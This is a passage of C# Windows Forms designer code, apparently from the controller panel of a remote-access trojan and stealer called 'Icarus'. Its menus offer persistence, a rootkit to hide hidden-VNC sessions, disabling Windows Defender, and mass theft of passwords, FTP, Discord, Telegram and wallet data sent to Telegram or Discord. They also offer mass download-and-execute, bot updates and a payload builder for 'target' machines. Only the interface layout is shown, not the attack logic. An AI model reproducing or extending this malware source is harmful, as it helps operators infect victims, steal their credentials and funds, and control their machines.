            this.imageList1.Images.SetKeyName(102, "ie.png");
            this.imageList1.Images.SetKeyName(103, "il.png");
            this.imageList1.Images.SetKeyName(104, "in.png");
            this.imageList1.Images.SetKeyName(105, "io.png");
            this.imageList1.Images.SetKeyName(106, "iq.png");
            this.imageList1.Images.SetKeyName(107, "ir.png");
            this.imageList1.Images.SetKeyName(108, "is.png");
            this.imageList1.Images.SetKeyName(109, "it.png");
            this.imageList1.Images.SetKeyName(110, "jm.png");
            this.imageList1.Images.SetKeyName(111, "jo.png");
            this.imageList1.Images.SetKeyName(112, "jp.png");
            this.imageList1.Images.SetKeyName(113, "ke.png");
            this.imageList1.Images.SetKeyName(114, "kg.png");
            this.imageList1.Images.SetKeyName(115, "kh.png");
            this.imageList1.Images.SetKeyName(116, "ki.png");
            this.imageList1.Images.SetKeyName(117, "km.png");
            this.imageList1.Images.SetKeyName(118, "kn.png");
            this.imageList1.Images.SetKeyName(119, "kp.png");
            this.imageList1.Images.SetKeyName(120, "kr.png");
            this.imageList1.Images.SetKeyName(121, "kw.png");
            this.imageList1.Images.SetKeyName(122, "ky.png");
            this.imageList1.Images.SetKeyName(123, "kz.png");
            this.imageList1.Images.SetKeyName(124, "la.png");
            this.imageList1.Images.SetKeyName(125, "lb.png");
            this.imageList1.Images.SetKeyName(126, "lc.png");
            this.imageList1.Images.SetKeyName(127, "li.png");
            this.imageList1.Images.SetKeyName(128, "lk.png");
            this.imageList1.Images.SetKeyName(129, "lr.png");
            this.imageList1.Images.SetKeyName(130, "ls.png");
            this.imageList1.Images.SetKeyName(131, "lt.png");
            this.imageList1.Images.SetKeyName(132, "lu.png");
            this.imageList1.Images.SetKeyName(133, "lv.png");
            this.imageList1.Images.SetKeyName(134, "ly.png");
            this.imageList1.Images.SetKeyName(135, "ma.png");
            this.imageList1.Images.SetKeyName(136, "mc.png");
            this.imageList1.Images.SetKeyName(137, "md.png");
            this.imageList1.Images.SetKeyName(138, "me.png");
            this.imageList1.Images.SetKeyName(139, "mg.png");
            this.imageList1.Images.SetKeyName(140, "mh.png");
            this.imageList1.Images.SetKeyName(141, "mk.png");
            this.imageList1.Images.SetKeyName(142, "ml.png");
            this.imageList1.Images.SetKeyName(143, "mm.png");
            this.imageList1.Images.SetKeyName(144, "mn.png");
            this.imageList1.Images.SetKeyName(145, "mo.png");
            this.imageList1.Images.SetKeyName(146, "mp.png");
            this.imageList1.Images.SetKeyName(147, "mq.png");
            this.imageList1.Images.SetKeyName(148, "mr.png");
            this.imageList1.Images.SetKeyName(149, "ms.png");
            this.imageList1.Images.SetKeyName(150, "mt.png");
            this.imageList1.Images.SetKeyName(151, "mu.png");
            this.imageList1.Images.SetKeyName(152, "mv.png");
            this.imageList1.Images.SetKeyName(153, "mw.png");
            this.imageList1.Images.SetKeyName(154, "mx.png");
            this.imageList1.Images.SetKeyName(155, "my.png");
            this.imageList1.Images.SetKeyName(156, "mz.png");
            this.imageList1.Images.SetKeyName(157, "na.png");
            this.imageList1.Images.SetKeyName(158, "nc.png");
            this.imageList1.Images.SetKeyName(159, "ne.png");
            this.imageList1.Images.SetKeyName(160, "nf.png");
            this.imageList1.Images.SetKeyName(161, "ng.png");
            this.imageList1.Images.SetKeyName(162, "ni.png");
            this.imageList1.Images.SetKeyName(163, "nl.png");
            this.imageList1.Images.SetKeyName(164, "no.png");
            this.imageList1.Images.SetKeyName(165, "np.png");
            this.imageList1.Images.SetKeyName(166, "nr.png");
            this.imageList1.Images.SetKeyName(167, "nu.png");
            this.imageList1.Images.SetKeyName(168, "nz.png");
            this.imageList1.Images.SetKeyName(169, "om.png");
            this.imageList1.Images.SetKeyName(170, "pa.png");
            this.imageList1.Images.SetKeyName(171, "pe.png");
            this.imageList1.Images.SetKeyName(172, "pf.png");
            this.imageList1.Images.SetKeyName(173, "pg.png");
            this.imageList1.Images.SetKeyName(174, "ph.png");
            this.imageList1.Images.SetKeyName(175, "pk.png");
            this.imageList1.Images.SetKeyName(176, "pl.png");
            this.imageList1.Images.SetKeyName(177, "pm.png");
            this.imageList1.Images.SetKeyName(178, "pn.png");
            this.imageList1.Images.SetKeyName(179, "pr.png");
            this.imageList1.Images.SetKeyName(180, "ps.png");
            this.imageList1.Images.SetKeyName(181, "pt.png");
            this.imageList1.Images.SetKeyName(182, "pw.png");
            this.imageList1.Images.SetKeyName(183, "py.png");
            this.imageList1.Images.SetKeyName(184, "qa.png");
            this.imageList1.Images.SetKeyName(185, "re.png");
            this.imageList1.Images.SetKeyName(186, "ro.png");
            this.imageList1.Images.SetKeyName(187, "rs.png");
            this.imageList1.Images.SetKeyName(188, "ru.png");
            this.imageList1.Images.SetKeyName(189, "rw.png");
            this.imageList1.Images.SetKeyName(190, "sa.png");
            this.imageList1.Images.SetKeyName(191, "sb.png");
            this.imageList1.Images.SetKeyName(192, "sc.png");
            this.imageList1.Images.SetKeyName(193, "scotland.png");
            this.imageList1.Images.SetKeyName(194, "sd.png");
            this.imageList1.Images.SetKeyName(195, "se.png");
            this.imageList1.Images.SetKeyName(196, "sg.png");
            this.imageList1.Images.SetKeyName(197, "sh.png");
            this.imageList1.Images.SetKeyName(198, "si.png");
            this.imageList1.Images.SetKeyName(199, "sj.png");
            this.imageList1.Images.SetKeyName(200, "sk.png");
            this.imageList1.Images.SetKeyName(201, "sl.png");
            this.imageList1.Images.SetKeyName(202, "sm.png");
            this.imageList1.Images.SetKeyName(203, "sn.png");
            this.imageList1.Images.SetKeyName(204, "so.png");
            this.imageList1.Images.SetKeyName(205, "sr.png");
            this.imageList1.Images.SetKeyName(206, "st.png");
            this.imageList1.Images.SetKeyName(207, "sv.png");
            this.imageList1.Images.SetKeyName(208, "sy.png");
            this.imageList1.Images.SetKeyName(209, "sz.png");
            this.imageList1.Images.SetKeyName(210, "tc.png");
            this.imageList1.Images.SetKeyName(211, "td.png");
            this.imageList1.Images.SetKeyName(212, "tf.png");
            this.imageList1.Images.SetKeyName(213, "tg.png");
            this.imageList1.Images.SetKeyName(214, "th.png");
            this.imageList1.Images.SetKeyName(215, "tj.png");
            this.imageList1.Images.SetKeyName(216, "tk.png");
            this.imageList1.Images.SetKeyName(217, "tl.png");
            this.imageList1.Images.SetKeyName(218, "tm.png");
            this.imageList1.Images.SetKeyName(219, "tn.png");
            this.imageList1.Images.SetKeyName(220, "to.png");
            this.imageList1.Images.SetKeyName(221, "tr.png");
            this.imageList1.Images.SetKeyName(222, "tt.png");
            this.imageList1.Images.SetKeyName(223, "tv.png");
            this.imageList1.Images.SetKeyName(224, "tw.png");
            this.imageList1.Images.SetKeyName(225, "tz.png");
            this.imageList1.Images.SetKeyName(226, "ua.png");
            this.imageList1.Images.SetKeyName(227, "ug.png");
            this.imageList1.Images.SetKeyName(228, "um.png");
            this.imageList1.Images.SetKeyName(229, "us.png");
            this.imageList1.Images.SetKeyName(230, "uy.png");
            this.imageList1.Images.SetKeyName(231, "uz.png");
            this.imageList1.Images.SetKeyName(232, "va.png");
            this.imageList1.Images.SetKeyName(233, "vc.png");
            this.imageList1.Images.SetKeyName(234, "ve.png");
            this.imageList1.Images.SetKeyName(235, "vg.png");
            this.imageList1.Images.SetKeyName(236, "vi.png");
            this.imageList1.Images.SetKeyName(237, "vn.png");
            this.imageList1.Images.SetKeyName(238, "vu.png");
            this.imageList1.Images.SetKeyName(239, "wales.png");
            this.imageList1.Images.SetKeyName(240, "wf.png");
            this.imageList1.Images.SetKeyName(241, "ws.png");
            this.imageList1.Images.SetKeyName(242, "xy.png");
            this.imageList1.Images.SetKeyName(243, "ye.png");
            this.imageList1.Images.SetKeyName(244, "yt.png");
            this.imageList1.Images.SetKeyName(245, "za.png");
            this.imageList1.Images.SetKeyName(246, "zm.png");
            this.imageList1.Images.SetKeyName(247, "zw.png");
            // 
            // contextMenuStrip1
            // 
            this.contextMenuStrip1.ImageScalingSize = new System.Drawing.Size(20, 20);
            this.contextMenuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.controlManagementToolStripMenuItem,
            this.miscOptionsToolStripMenuItem,
            this.serverControlToolStripMenuItem,
            this.icarussThiefToolStripMenuItem,
            this.hVNCPanelToolStripMenuItem,
            this.buildHVNCToolStripMenuItem,
            this.remoteDesktopToolStripMenuItem});
            this.contextMenuStrip1.Name = "contextMenuStrip1";
            this.contextMenuStrip1.Size = new System.Drawing.Size(183, 186);
            // 
            // controlManagementToolStripMenuItem
            // 
            this.controlManagementToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startupToolStripMenuItem,
            this.taskToolStripMenuItem});
            this.controlManagementToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("controlManagementToolStripMenuItem.Image")));
            this.controlManagementToolStripMenuItem.Name = "controlManagementToolStripMenuItem";
            this.controlManagementToolStripMenuItem.Size = new System.Drawing.Size(182, 26);
            this.controlManagementToolStripMenuItem.Text = "Persistence Options";
            // 
            // startupToolStripMenuItem
            // 
            this.startupToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("startupToolStripMenuItem.Image")));
            this.startupToolStripMenuItem.Name = "startupToolStripMenuItem";
            this.startupToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
            this.startupToolStripMenuItem.Text = "Add";
            this.startupToolStripMenuItem.ToolTipText = "Add Startup and Task All in one!";
            this.startupToolStripMenuItem.Click += new System.EventHandler(this.startupToolStripMenuItem_Click);
            // 
            // taskToolStripMenuItem
            // 
            this.taskToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("taskToolStripMenuItem.Image")));
            this.taskToolStripMenuItem.Name = "taskToolStripMenuItem";
            this.taskToolStripMenuItem.Size = new System.Drawing.Size(117, 22);
            this.taskToolStripMenuItem.Text = "Remove";
            this.taskToolStripMenuItem.ToolTipText = "Remove Startup and Task!";
            this.taskToolStripMenuItem.Click += new System.EventHandler(this.taskToolStripMenuItem_Click);
            // 
            // miscOptionsToolStripMenuItem
            // 
            this.miscOptionsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.watcherToolStripMenuItem,
            this.rootkitToolStripMenuItem,
            this.killWindowsDefenderToolStripMenuItem,
            this.passwordsRecoveryToolStripMenuItem,
            this.stealAndSendToDiscordToolStripMenuItem,
            this.massWalletStealerToolStripMenuItem,
            this.massDownloadExecuteToolStripMenuItem});
            this.miscOptionsToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("miscOptionsToolStripMenuItem.Image")));
            this.miscOptionsToolStripMenuItem.Name = "miscOptionsToolStripMenuItem";
            this.miscOptionsToolStripMenuItem.Size = new System.Drawing.Size(182, 26);
            this.miscOptionsToolStripMenuItem.Text = "Misc Options";
            // 
            // watcherToolStripMenuItem
            // 
            this.watcherToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("watcherToolStripMenuItem.Image")));
            this.watcherToolStripMenuItem.Name = "watcherToolStripMenuItem";
            this.watcherToolStripMenuItem.Size = new System.Drawing.Size(246, 22);
            this.watcherToolStripMenuItem.Text = "Watcher";
            this.watcherToolStripMenuItem.ToolTipText = "If you activate Watcher ,do not activate Rootkit!";
            this.watcherToolStripMenuItem.Visible = false;
            this.watcherToolStripMenuItem.Click += new System.EventHandler(this.watcherToolStripMenuItem_Click);
            // 
            // rootkitToolStripMenuItem
            // 
            this.rootkitToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("rootkitToolStripMenuItem.Image")));
            this.rootkitToolStripMenuItem.Name = "rootkitToolStripMenuItem";
            this.rootkitToolStripMenuItem.Size = new System.Drawing.Size(246, 22);
            this.rootkitToolStripMenuItem.Text = "Rootkit(Hide HVNC Proc)";
            this.rootkitToolStripMenuItem.ToolTipText = "If you activate Rootkit ,do not activate Watcher!";
            this.rootkitToolStripMenuItem.Visible = false;
            this.rootkitToolStripMenuItem.Click += new System.EventHandler(this.rootkitToolStripMenuItem_Click);
            // 
            // killWindowsDefenderToolStripMenuItem
            // 
            this.killWindowsDefenderToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("killWindowsDefenderToolStripMenuItem.Image")));
            this.killWindowsDefenderToolStripMenuItem.Name = "killWindowsDefenderToolStripMenuItem";
            this.killWindowsDefenderToolStripMenuItem.Size = new System.Drawing.Size(246, 22);
            this.killWindowsDefenderToolStripMenuItem.Text = "Kill Windows Defender";
            this.killWindowsDefenderToolStripMenuItem.ToolTipText = "Disable Windows Defender!";
            this.killWindowsDefenderToolStripMenuItem.Click += new System.EventHandler(this.killWindowsDefenderToolStripMenuItem_Click);
            // 
            // passwordsRecoveryToolStripMenuItem
            // 
            this.passwordsRecoveryToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("passwordsRecoveryToolStripMenuItem.Image")));
            this.passwordsRecoveryToolStripMenuItem.Name = "passwordsRecoveryToolStripMenuItem";
            this.passwordsRecoveryToolStripMenuItem.Size = new System.Drawing.Size(246, 22);
            this.passwordsRecoveryToolStripMenuItem.Text = "Mass Steal and Send to Telegram";
            this.passwordsRecoveryToolStripMenuItem.Visible = false;
            this.passwordsRecoveryToolStripMenuItem.Click += new System.EventHandler(this.passwordsRecoveryToolStripMenuItem_Click_1);
            // 
            // stealAndSendToDiscordToolStripMenuItem
            // 
            this.stealAndSendToDiscordToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("stealAndSendToDiscordToolStripMenuItem.Image")));
            this.stealAndSendToDiscordToolStripMenuItem.Name = "stealAndSendToDiscordToolStripMenuItem";
            this.stealAndSendToDiscordToolStripMenuItem.Size = new System.Drawing.Size(246, 22);
            this.stealAndSendToDiscordToolStripMenuItem.Text = "Mass Steal and Send to Discord";
            this.stealAndSendToDiscordToolStripMenuItem.Visible = false;
            this.stealAndSendToDiscordToolStripMenuItem.Click += new System.EventHandler(this.stealAndSendToDiscordToolStripMenuItem_Click);
            // 
            // massWalletStealerToolStripMenuItem
            // 
            this.massWalletStealerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("massWalletStealerToolStripMenuItem.Image")));
            this.massWalletStealerToolStripMenuItem.Name = "massWalletStealerToolStripMenuItem";
            this.massWalletStealerToolStripMenuItem.Size = new System.Drawing.Size(246, 22);
            this.massWalletStealerToolStripMenuItem.Text = "Mass Wallet Stealer";
            this.massWalletStealerToolStripMenuItem.Visible = false;
            // 
            // massDownloadExecuteToolStripMenuItem
            // 
            this.massDownloadExecuteToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("massDownloadExecuteToolStripMenuItem.Image")));
            this.massDownloadExecuteToolStripMenuItem.Name = "massDownloadExecuteToolStripMenuItem";
            this.massDownloadExecuteToolStripMenuItem.Size = new System.Drawing.Size(246, 22);
            this.massDownloadExecuteToolStripMenuItem.Text = "Mass Download and Execute";
            this.massDownloadExecuteToolStripMenuItem.Visible = false;
            this.massDownloadExecuteToolStripMenuItem.Click += new System.EventHandler(this.massDownloadExecuteToolStripMenuItem_Click);
            // 
            // serverControlToolStripMenuItem
            // 
            this.serverControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.uninstallToolStripMenuItem,
            this.restartToolStripMenuItem,
            this.resetSizeToolStripMenuItem,
            this.updateBotsToolStripMenuItem,
            this.downloadExecutewithArgsToolStripMenuItem});
            this.serverControlToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("serverControlToolStripMenuItem.Image")));
            this.serverControlToolStripMenuItem.Name = "serverControlToolStripMenuItem";
            this.serverControlToolStripMenuItem.Size = new System.Drawing.Size(182, 26);
            this.serverControlToolStripMenuItem.Text = "Server Control";
            // 
            // uninstallToolStripMenuItem
            // 
            this.uninstallToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("uninstallToolStripMenuItem.Image")));
            this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
            this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(254, 22);
            this.uninstallToolStripMenuItem.Text = "Uninstall";
            this.uninstallToolStripMenuItem.ToolTipText = "Kill and remove payload!";
            this.uninstallToolStripMenuItem.Click += new System.EventHandler(this.uninstallToolStripMenuItem_Click);
            // 
            // restartToolStripMenuItem
            // 
            this.restartToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("restartToolStripMenuItem.Image")));
            this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
            this.restartToolStripMenuItem.Size = new System.Drawing.Size(254, 22);
            this.restartToolStripMenuItem.Text = "Restart";
            this.restartToolStripMenuItem.Visible = false;
            // 
            // resetSizeToolStripMenuItem
            // 
            this.resetSizeToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("resetSizeToolStripMenuItem.Image")));
            this.resetSizeToolStripMenuItem.Name = "resetSizeToolStripMenuItem";
            this.resetSizeToolStripMenuItem.Size = new System.Drawing.Size(254, 22);
            this.resetSizeToolStripMenuItem.Text = "Reset Size";
            this.resetSizeToolStripMenuItem.ToolTipText = "Reset Scale hVNC!";
            this.resetSizeToolStripMenuItem.Click += new System.EventHandler(this.resetSizeToolStripMenuItem_Click);
            // 
            // updateBotsToolStripMenuItem
            // 
            this.updateBotsToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("updateBotsToolStripMenuItem.Image")));
            this.updateBotsToolStripMenuItem.Name = "updateBotsToolStripMenuItem";
            this.updateBotsToolStripMenuItem.Size = new System.Drawing.Size(254, 22);
            this.updateBotsToolStripMenuItem.Text = "Update Bots";
            this.updateBotsToolStripMenuItem.Click += new System.EventHandler(this.updateBotsToolStripMenuItem_Click);
            // 
            // downloadExecutewithArgsToolStripMenuItem
            // 
            this.downloadExecutewithArgsToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("downloadExecutewithArgsToolStripMenuItem.Image")));
            this.downloadExecutewithArgsToolStripMenuItem.Name = "downloadExecutewithArgsToolStripMenuItem";
            this.downloadExecutewithArgsToolStripMenuItem.Size = new System.Drawing.Size(254, 22);
            this.downloadExecutewithArgsToolStripMenuItem.Text = "Download and Execute (with args)";
            this.downloadExecutewithArgsToolStripMenuItem.Visible = false;
            this.downloadExecutewithArgsToolStripMenuItem.Click += new System.EventHandler(this.downloadExecutewithArgsToolStripMenuItem_Click);
            // 
            // icarussThiefToolStripMenuItem
            // 
            this.icarussThiefToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.massExecuteStealerToolStripMenuItem,
            this.massExcuteFTPStealerToolStripMenuItem,
            this.massExecuteDiscordStealerToolStripMenuItem,
            this.massExecuteTelegramStealerToolStripMenuItem,
            this.massExecuteWalletStealerToolStripMenuItem});
            this.icarussThiefToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("icarussThiefToolStripMenuItem.Image")));
            this.icarussThiefToolStripMenuItem.Name = "icarussThiefToolStripMenuItem";
            this.icarussThiefToolStripMenuItem.Size = new System.Drawing.Size(182, 26);
            this.icarussThiefToolStripMenuItem.Text = "Icarus Thief";
            // 
            // massExecuteStealerToolStripMenuItem
            // 
            this.massExecuteStealerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("massExecuteStealerToolStripMenuItem.Image")));
            this.massExecuteStealerToolStripMenuItem.Name = "massExecuteStealerToolStripMenuItem";
            this.massExecuteStealerToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.massExecuteStealerToolStripMenuItem.Text = "Mass Execute PHP Stealer";
            this.massExecuteStealerToolStripMenuItem.Click += new System.EventHandler(this.massExecuteStealerToolStripMenuItem_Click);
            // 
            // massExcuteFTPStealerToolStripMenuItem
            // 
            this.massExcuteFTPStealerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("massExcuteFTPStealerToolStripMenuItem.Image")));
            this.massExcuteFTPStealerToolStripMenuItem.Name = "massExcuteFTPStealerToolStripMenuItem";
            this.massExcuteFTPStealerToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.massExcuteFTPStealerToolStripMenuItem.Text = "Mass Execute FTP Stealer";
            this.massExcuteFTPStealerToolStripMenuItem.Click += new System.EventHandler(this.massExcuteFTPStealerToolStripMenuItem_Click);
            // 
            // massExecuteDiscordStealerToolStripMenuItem
            // 
            this.massExecuteDiscordStealerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("massExecuteDiscordStealerToolStripMenuItem.Image")));
            this.massExecuteDiscordStealerToolStripMenuItem.Name = "massExecuteDiscordStealerToolStripMenuItem";
            this.massExecuteDiscordStealerToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.massExecuteDiscordStealerToolStripMenuItem.Text = "Mass Execute Discord Stealer";
            this.massExecuteDiscordStealerToolStripMenuItem.Click += new System.EventHandler(this.massExecuteDiscordStealerToolStripMenuItem_Click);
            // 
            // massExecuteTelegramStealerToolStripMenuItem
            // 
            this.massExecuteTelegramStealerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("massExecuteTelegramStealerToolStripMenuItem.Image")));
            this.massExecuteTelegramStealerToolStripMenuItem.Name = "massExecuteTelegramStealerToolStripMenuItem";
            this.massExecuteTelegramStealerToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.massExecuteTelegramStealerToolStripMenuItem.Text = "Mass Execute Telegram Stealer";
            this.massExecuteTelegramStealerToolStripMenuItem.Click += new System.EventHandler(this.massExecuteTelegramStealerToolStripMenuItem_Click);
            // 
            // massExecuteWalletStealerToolStripMenuItem
            // 
            this.massExecuteWalletStealerToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("massExecuteWalletStealerToolStripMenuItem.Image")));
            this.massExecuteWalletStealerToolStripMenuItem.Name = "massExecuteWalletStealerToolStripMenuItem";
            this.massExecuteWalletStealerToolStripMenuItem.Size = new System.Drawing.Size(234, 22);
            this.massExecuteWalletStealerToolStripMenuItem.Text = "Mass Execute Wallet Stealer";
            this.massExecuteWalletStealerToolStripMenuItem.Click += new System.EventHandler(this.massExecuteWalletStealerToolStripMenuItem_Click);
            // 
            // hVNCPanelToolStripMenuItem
            // 
            this.hVNCPanelToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("hVNCPanelToolStripMenuItem.Image")));
            this.hVNCPanelToolStripMenuItem.Name = "hVNCPanelToolStripMenuItem";
            this.hVNCPanelToolStripMenuItem.Size = new System.Drawing.Size(182, 26);
            this.hVNCPanelToolStripMenuItem.Text = "hVNC Panel";
            this.hVNCPanelToolStripMenuItem.ToolTipText = "Open hVNC Controller!";
            this.hVNCPanelToolStripMenuItem.Click += new System.EventHandler(this.hVNCPanelToolStripMenuItem_Click);
            // 
            // buildHVNCToolStripMenuItem
            // 
            this.buildHVNCToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("buildHVNCToolStripMenuItem.Image")));
            this.buildHVNCToolStripMenuItem.Name = "buildHVNCToolStripMenuItem";
            this.buildHVNCToolStripMenuItem.Size = new System.Drawing.Size(182, 26);
            this.buildHVNCToolStripMenuItem.Text = "Payload Builder";
            this.buildHVNCToolStripMenuItem.ToolTipText = "Build a Payload to run on target mashine!";
            this.buildHVNCToolStripMenuItem.Click += new System.EventHandler(this.buildHVNCToolStripMenuItem_Click);
            // 
            // remoteDesktopToolStripMenuItem
            // 
            this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
            this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(182, 26);
            this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
            this.remoteDesktopToolStripMenuItem.Visible = false;
            this.remoteDesktopToolStripMenuItem.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem_Click);
            // 
            // imageList2
            // 
            this.imageList2.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList2.ImageStream")));
            this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList2.Images.SetKeyName(0, "server_delete.png");
            this.imageList2.Images.SetKeyName(1, "server_disconnect.png");
            // 
            // timer1
            // 
            this.timer1.Interval = 10000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // timer2
            // 
            this.timer2.Tick += new System.EventHandler(this.timer2_Tick);
            // 
            // primeTheme1
            // 
            this.primeTheme1.BackColor = System.Drawing.Color.White;
            this.primeTheme1.BorderStyle = System.Windows.Forms.FormBorderStyle.None;
            bloom1.Name = "Sides";
            bloom1.Value = System.Drawing.Color.FromArgb(((int)(((byte)(232)))), ((int)(((byte)(232)))), ((int)(((byte)(232)))));
            bloom2.Name = "Gradient1";
            bloom2.Value = System.Drawing.Color.FromArgb(((int)(((byte)(252)))), ((int)(((byte)(252)))), ((int)(((byte)(252)))));
            bloom3.Name = "Gradient2";
            bloom3.Value = System.Drawing.Color.FromArgb(((int)(((byte)(242)))), ((int)(((byte)(242)))), ((int)(((byte)(242)))));
            bloom4.Name = "TextShade";
            bloom4.Value = System.Drawing.Color.White;
            bloom5.Name = "Text";
            bloom5.Value = System.Drawing.Color.FromArgb(((int)(((byte)(80)))), ((int)(((byte)(80)))), ((int)(((byte)(80)))));
            bloom6.Name = "Back";
            bloom6.Value = System.Drawing.Color.White;
            bloom7.Name = "Border1";
            bloom7.Value = System.Drawing.Color.FromArgb(((int)(((byte)(180)))), ((int)(((byte)(180)))), ((int)(((byte)(180)))));
            bloom8.Name = "Border2";
            bloom8.Value = System.Drawing.Color.White;
            bloom9.Name = "Border3";
            bloom9.Value = System.Drawing.Color.White;
            bloom10.Name = "Border4";
            bloom10.Value = System.Drawing.Color.FromArgb(((int)(((byte)(150)))), ((int)(((byte)(150)))), ((int)(((byte)(150)))));
            this.primeTheme1.Colors = new ShitarusPrivate.Bloom[] {
        bloom1,
        bloom2,
        bloom3,
        bloom4,
        bloom5,
        bloom6,
        bloom7,
        bloom8,
        bloom9,
        bloom10};
            this.primeTheme1.Controls.Add(this.label3);
            this.primeTheme1.Controls.Add(this.pictureBox1);
            this.primeTheme1.Controls.Add(this.studioButton1);
            this.primeTheme1.Controls.Add(this.studioButton5);
            this.primeTheme1.Controls.Add(this.ClientsList);
            this.primeTheme1.Controls.Add(this.studioButton4);
            this.primeTheme1.Controls.Add(this.studioButton3);
            this.primeTheme1.Controls.Add(this.panel1);
            this.primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            this.primeTheme1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.primeTheme1.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.primeTheme1.Image = null;
            this.primeTheme1.Location = new System.Drawing.Point(0, 0);
            this.primeTheme1.Movable = true;
            this.primeTheme1.Name = "primeTheme1";
            this.primeTheme1.NoRounding = false;
            this.primeTheme1.Sizable = true;
            this.primeTheme1.Size = new System.Drawing.Size(1374, 671);
            this.primeTheme1.SmartBounds = true;
            this.primeTheme1.TabIndex = 2;
            this.primeTheme1.TransparencyKey = System.Drawing.Color.Fuchsia;
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.BackColor = System.Drawing.Color.Transparent;
            this.label3.Font = new System.Drawing.Font("Verdana", 9.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label3.ForeColor = System.Drawing.Color.Black;
            this.label3.Location = new System.Drawing.Point(39, 13);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(53, 16);
            this.label3.TabIndex = 38;
            this.label3.Text = "Icarus";
            // 
            // pictureBox1
            // 
            this.pictureBox1.BackColor = System.Drawing.Color.Transparent;
            this.pictureBox1.Location = new System.Drawing.Point(1, 0);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(51, 48);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.pictureBox1.TabIndex = 37;
            this.pictureBox1.TabStop = false;
            // 
            // studioButton1
            // 
            this.studioButton1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.studioButton1.BackColor = System.Drawing.Color.Transparent;
            bloom11.Name = "DownGradient1";
            bloom11.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom12.Name = "DownGradient2";
            bloom12.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom13.Name = "NoneGradient1";
            bloom13.Value = System.Drawing.Color.FromArgb(((int)(((byte)(65)))), ((int)(((byte)(85)))), ((int)(((byte)(115)))));
            bloom14.Name = "NoneGradient2";
            bloom14.Value = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(65)))), ((int)(((byte)(95)))));
            bloom15.Name = "Shine1";
            bloom15.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom16.Name = "Shine2A";
            bloom16.Value = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom17.Name = "Shine2B";
            bloom17.Value = System.Drawing.Color.Transparent;
            bloom18.Name = "Shine3";
            bloom18.Value = System.Drawing.Color.FromArgb(((int)(((byte)(20)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))), ((int)(((byte)(255)))));
            bloom19.Name = "TextShade";
            bloom19.Value = System.Drawing.Color.FromArgb(((int)(((byte)(50)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))), ((int)(((byte)(0)))));
            bloom20.Name = "Text";
